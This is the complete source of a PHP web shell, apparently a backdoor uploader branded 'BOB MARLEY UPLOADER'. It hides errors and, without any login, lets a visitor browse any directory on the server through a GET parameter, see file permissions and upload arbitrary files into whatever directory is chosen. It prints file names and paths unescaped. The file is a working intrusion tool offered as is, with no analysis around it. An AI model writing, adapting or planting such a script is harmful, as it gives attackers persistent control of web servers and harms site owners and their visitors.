<?php
@error_reporting(0);@ini_set('display_errors',0);
$d=isset($_GET['d'])?realpath($_GET['d']):getcwd();
if(!$d)$d=getcwd();
chdir($d);
if(isset($_FILES['f'])){
    $n=basename($_FILES['f']['name']);
    if(move_uploaded_file($_FILES['f']['tmp_name'],$n)){
        echo"<div style='color:#0f0;background:#001a00;border:1px solid #0f0;padding:8px;margin:10px 0'>✓ Uploaded: <b>$n</b></div>";
    }else{
        echo"<div style='color:#f00;background:#1a0000;border:1px solid #f00;padding:8px;margin:10px 0'>✗ Upload failed</div>";
    }
}
echo"<!DOCTYPE html><html><head><title>BOB MARLEY UPLOADER</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Courier New',monospace;background:#000;color:#0f0;padding:15px}a{color:#0f0;text-decoration:none}a:hover{color:#0ff;text-decoration:underline}.container{max-width:1200px;margin:0 auto;border:2px solid #0f0;padding:15px;background:#001a00}.header{text-align:center;border-bottom:2px solid #0f0;padding:10px;margin-bottom:15px}.header h1{color:#0f0;font-size:24px;text-shadow:0 0 10px #0f0}.path{background:#003300;padding:8px;margin:10px 0;border:1px solid #0f0;word-break:break-all}.upload-form{background:#002200;padding:10px;border:1px solid #0f0;margin:10px 0}input[type=file]{background:#001a00;color:#0f0;border:1px solid #0f0;padding:5px;width:100%;margin-bottom:5px}input[type=submit]{background:#0f0;color:#000;border:none;padding:8px 20px;cursor:pointer;font-weight:bold;font-family:'Courier New',monospace}input[type=submit]:hover{background:#0ff}table{width:100%;border-collapse:collapse;margin-top:10px}th,td{padding:8px;text-align:left;border:1px solid #0f0}th{background:#003300;color:#0f0;font-weight:bold}tr:hover{background:#002200}.dir{color:#0ff}.file{color:#0f0}.size{color:#090}.info{font-size:11px;color:#090;margin-top:10px;text-align:center}</style></head><body><div class='container'><div class='header'><h1>♦ BOB MARLEY UPLOADER ♦</h1><p style='font-size:11px;color:#090'>One Love | One Heart | One Upload</p></div><div class='path'><b>Current Dir:</b> $d";
$parent=dirname($d);
if($parent!=$d)echo" | <a href='?d=".urlencode($parent)."'>[Parent Dir ↑]</a>";
echo"</div><div class='upload-form'><form method='post' enctype='multipart/form-data'><input type='file' name='f' required><input type='submit' value='🚀 UPLOAD FILE'></form></div><table><tr><th>Name</th><th>Size</th><th>Modified</th><th>Perms</th></tr>";
$items=scandir('.');
foreach($items as $item){
    if($item=='.')continue;
    $full=$d.'/'.$item;
    $isDir=is_dir($item);
    $class=$isDir?'dir':'file';
    $icon=$isDir?'📁':'📄';
    if($item=='..')$icon='⬆️';
    $size=$isDir?'DIR':number_format(filesize($item)).' B';
    $time=date('Y-m-d H:i',filemtime($item));
    $perms=substr(sprintf('%o',fileperms($item)),-4);
    $link=$isDir?"?d=".urlencode($full):$item;
    echo"<tr><td class='$class'>$icon <a href='$link'>$item</a></td><td class='size'>$size</td><td>$time</td><td>$perms</td></tr>";
}
echo"</table><div class='info'>Powered by BOB MARLEY | One Love</div></div></body></html>";
?>
